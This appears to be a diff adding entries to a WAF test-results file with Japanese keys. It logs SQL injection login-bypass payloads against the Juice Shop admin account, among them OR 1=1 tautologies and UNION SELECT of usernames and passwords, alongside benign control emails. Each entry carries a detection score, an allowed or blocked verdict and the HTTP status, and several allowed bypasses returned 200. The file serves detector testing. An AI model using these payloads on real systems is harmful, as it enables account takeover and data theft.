@@ -2791,5 +2791,1433 @@
         "アラートレベル": "low-level",
         "WAF": "Allowed",
         "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' #",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 1=1 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 'a'='a",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' UNION SELECT null, user(), database() --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1' LIMIT 1 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1' -- ",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 1=1 /*",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 'x'='x' -- -",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1' --+ ",
+        "スコア": 90,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1' /*",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 1=1 --+ ",
+        "スコア": 90,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1' #",
+        "スコア": 90,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1'--",
+        "スコア": 90,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1'-- ",
+        "スコア": 90,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1'--",
+        "スコア": 90,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 1=1--",
+        "スコア": 90,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 1=1-- ",
+        "スコア": 90,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1'-- -",
+        "スコア": 90,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 'a'='a",
+        "スコア": 60,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '2'='2",
+        "スコア": 60,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 2=2",
+        "スコア": 60,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 'true'='true",
+        "スコア": 60,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' UNION SELECT null, username, password FROM users--",
+        "スコア": 120,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1' WAITFOR DELAY '0:0:5'--",
+        "スコア": 100,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1'/*--",
+        "スコア": 100,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1'--\n",
+        "スコア": 100,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1'--\r",
+        "スコア": 100,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1' %00",
+        "スコア": 60,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' --",
+        "スコア": 40,
+        "アラートレベル": "medium-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' #",
+        "スコア": 40,
+        "アラートレベル": "medium-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin@juice-shop.com'/*",
+        "スコア": 40,
+        "アラートレベル": "medium-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' UNION SELECT null, null--",
+        "スコア": 100,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 1=1 --",
+        "スコア": 90,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 'a'='a",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 1<2--",
+        "スコア": 40,
+        "アラートレベル": "medium-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 'x'='x'--",
+        "スコア": 90,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR TRUE--",
+        "スコア": 40,
+        "アラートレベル": "medium-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' UNION SELECT null, null--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR 'a'='a--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR 1<2--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "' OR TRUE--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1--",
+        "スコア": 8,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' UNION SELECT null, null--",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR ''='''--",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR 1<2--",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "' OR TRUE--",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1--",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' UNION SELECT null, null--",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR ''='''--",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR 1<2--",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "' OR TRUE--",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin'--",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin' #",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin'/*",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin' OR 1=1--",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin' OR '1'='1'#",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin' OR '1'='1'/*",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin' OR 'x'='x'--",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a' --",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 5,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin'--",
+        "スコア": 20,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin' #",
+        "スコア": 20,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin'/*",
+        "スコア": 20,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a",
+        "スコア": 30,
+        "アラートレベル": "medium-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR 1=1--",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1'#",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1'/*",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR 'x'='x'--",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a' --",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --comment",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' /*",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' #",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a' #",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a' /*",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --comment",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' /*",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' #",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a' #",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a' /*",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --comment",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' /*",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' #",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a' #",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR 'a'='a' /*",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' -- ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin' OR 1=1 LIMIT 1--",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' UNION SELECT null,null--",
+        "スコア": 105,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --+ ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1'%23",
+        "スコア": 30,
+        "アラートレベル": "medium-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin' OR '1'='1'-- -",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' /*",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' #",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "test@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "yamada.taro@gmail.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "O'Brien@example.com",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "info@company.co.jp",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user_123@mail.net",
+        "スコア": 0,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin' OR 1=1 LIMIT 1--",
+        "スコア": 50,
+        "アラートレベル": "high-level",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' UNION SELECT null,null--",
+        "スコア": 105,
+        "アラートレベル": "WARNING",
+        "WAF": "blocked",
+        "ステータスコード": 403
+    },
+    {
+        "ペイロード": "admin' OR '1'='1' --+ ",
+        "スコア": 50,
+        "アラートレベル": "high-level",
